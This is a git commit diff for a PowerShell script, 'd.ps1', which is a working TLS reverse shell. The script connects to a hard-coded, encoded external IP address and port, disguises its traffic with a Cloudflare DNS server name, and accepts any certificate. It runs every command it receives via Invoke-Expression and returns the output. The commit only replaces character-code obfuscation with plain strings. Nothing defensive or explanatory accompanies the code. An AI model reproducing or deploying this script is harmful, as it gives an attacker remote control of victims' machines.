9f9d3968b8d278dcdf9f07a05cf762fee65fa37f
jktvz <admininfogathering@proton.me>
2026-02-12 02:52:42 +0300

    Update d.ps1

--- d.ps1
+++ d.ps1
@@ -8,7 +8,7 @@ try {
     $sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12;
     
     
-    $targetIP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((-join([char]0x4D, [char]0x54, [char]0x51, [char]0x32, [char]0x4C, [char]0x6A, [char]0x63, [char]0x77, [char]0x4C, [char]0x6A, [char]0x49, [char]0x30, [char]0x4D, [char]0x43, [char]0x34, [char]0x79, [char]0x4D, [char]0x44, [char]0x55, [char]0x3D))));
+    $targetIP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MTQ2LjcwLjI0MC4yMDU='));
     $port = 40398;
 
     $TCPClient = New-Object Net.Sockets.TCPClient($targetIP, $port);
@@ -16,7 +16,7 @@ try {
     
     
     $SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
-    $SslStream.AuthenticateAsClient(([System.Text.Encoding]::UTF8.GetString([byte[]](0x63,0x6C,0x6F,0x75,0x64,0x66,0x6C,0x61,0x72,0x65,0x2D,0x64,0x6E,0x73,0x2E,0x63,0x6F,0x6D))), $null, $sslProtocols, $false);
+    $SslStream.AuthenticateAsClient("cloudflare-dns.com", $null, $sslProtocols, $false);
 
     if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
         $SslStream.Close();
@@ -29,7 +29,7 @@ try {
     # Function to format the shell prompt
     function WriteToStream ($String) {
         [byte[]]$script:Buffer = New-Object System.Byte[] 4096;
-        $StreamWriter.Write($String + "$([char]0x50)$([char]0x53)$([char]0x20)" + (Get-Location).Path + "$([char]0x3E)$([char]0x20)");
+        $StreamWriter.Write($String + "PS " + (Get-Location).Path + "> ");
     };
 
     WriteToStream '';
@@ -38,7 +38,7 @@ try {
     while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
         $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1).Trim();
         
-        if ($Command -eq (-join([char]0x65, [char]0x78, [char]0x69, [char]0x74))) { break }
+        if ($Command -eq 'exit') { break }
         
         $Output = try {
             Invoke-Expression $Command 2>&1 | Out-String
